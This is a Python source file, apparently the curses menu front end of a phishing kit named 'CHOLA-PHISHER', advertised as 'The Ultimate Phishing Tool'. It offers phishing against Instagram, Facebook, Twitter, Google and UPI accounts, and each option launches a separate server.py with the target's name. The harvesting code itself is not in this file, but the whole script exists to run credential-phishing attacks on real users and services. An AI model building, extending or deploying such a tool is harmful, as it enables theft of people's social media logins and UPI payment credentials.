import curses
import subprocess
import os

def print_banner(stdscr):
    banner = """
     
██████╗ ██╗  ██╗ ██████╗ ██╗      █████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║  ██║██╔═══██╗██║     ██╔══██╗    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝███████║██║   ██║██║     ███████║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
██╔═══╝ ██╔══██║██║   ██║██║     ██╔══██║    ██╔══██╗██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╔╝███████╗██║  ██║    ██║  ██║██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
           CHOLA-PHISHER - The Ultimate Phishing Tool
    """
    stdscr.addstr(0, 0, banner)
    stdscr.refresh()

def main(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    print_banner(stdscr)

    stdscr.addstr(10, 10, "Welcome to CHOLA-PHISHER")
    stdscr.addstr(12, 10, "1. Instagram Phishing")
    stdscr.addstr(13, 10, "2. Facebook Phishing")
    stdscr.addstr(14, 10, "3. Twitter Phishing")
    stdscr.addstr(15, 10, "4. Google Phishing")
    stdscr.addstr(16, 10, "5. UPI Phishing")
    stdscr.addstr(17, 10, "6. Exit")
    stdscr.refresh()

    while True:
        key = stdscr.getch()
        if key == ord('1'):
            stdscr.addstr(19, 10, "Starting Instagram phishing...")
            stdscr.refresh()
            subprocess.run(['python', 'server.py', 'instagram'])
            break
        elif key == ord('2'):
            stdscr.addstr(19, 10, "Starting Facebook phishing...")
            stdscr.refresh()
            subprocess.run(['python', 'server.py', 'facebook'])
            break
        elif key == ord('3'):
            stdscr.addstr(19, 10, "Starting Twitter phishing...")
            stdscr.refresh()
            subprocess.run(['python', 'server.py', 'twitter'])
            break
        elif key == ord('4'):
            stdscr.addstr(19, 10, "Starting Google phishing...")
            stdscr.refresh()
            subprocess.run(['python', 'server.py', 'google'])
            break
        elif key == ord('5'):
            stdscr.addstr(19, 10, "Starting UPI phishing...")
            stdscr.refresh()
            subprocess.run(['python', 'server.py', 'upi'])
            break
        elif key == ord('6'):
            break

if __name__ == '__main__':
    curses.wrapper(main)